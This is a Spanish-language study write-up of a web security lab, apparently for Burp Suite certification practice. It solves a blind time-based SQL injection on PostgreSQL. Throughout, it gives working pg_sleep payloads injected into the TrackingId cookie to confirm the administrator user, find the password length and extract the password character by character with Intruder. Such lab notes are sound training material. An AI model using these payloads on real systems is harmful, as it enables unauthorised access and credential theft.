#BSCP #SQLinjection #Blind #Time-Based #PostgreSQL

En este laboratorio se nos pide obtener las credenciales del usuario `administrator` de la tabla `users` donde los datos están las columnas `username` y `password`

En el campo de `TrackingId` podemos realizar inyecciones SQL, probamos haciendo uso de una `'` sola, luego cerramos el resto de la petición usando `'--` y seguimos obteniendo el mismo código de respuesta sin errores.

Introduciremos un payload que genere un retraso en caso de que la condición `1=1` sea verdadera y en caso de que no lo sea no generara el retraso. AL ser una base de datos *PostgreSQL*
```sql
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
![[Pasted image 20261105121424.png]]

Como la condición es cierta se nos genera el retraso esperado, para verificar que no es un caso aislado este retraso vamos a probar con una condición falsa
```sql
'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

En este caso se nos devuelve una respuesta inmediata, ya que es una condición falsa
Ahora deberemos de enumerar y validar que existe el usuario `administrator`
```sql
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
![[Pasted image 20261105121943.png]]

Volvemos a obtener una respuesta con delay, lo que quiere decir que si existe el usuario, ahora deberemos de validar cuantos caracteres contiene la contraseña de este
```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>6)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

En este caso obtenemos el retraso esperado, vamos a seguir subiendo el valor hasta dar con la longitud total
```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
![[Pasted image 20261105122224.png]]

Sabemos que la contraseña tiene una longitud igual a `20` caracteres, ahora deberemos de determinar carácter a carácter, para ello adaptaremos la consulta
```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(6)+ELSE+pg_sleep(0)+END+FROM+users--
```

Nos la mandaremos al intruder, y sustituiremos en el carácter `a` y añadiremos una wordlist que abarque todos los caracteres alfanuméricos
![[Pasted image 20261105123304.png]]

Podemos ubicar que el primer carácter es el numero `3`
![[Pasted image 20261105123554.png]]
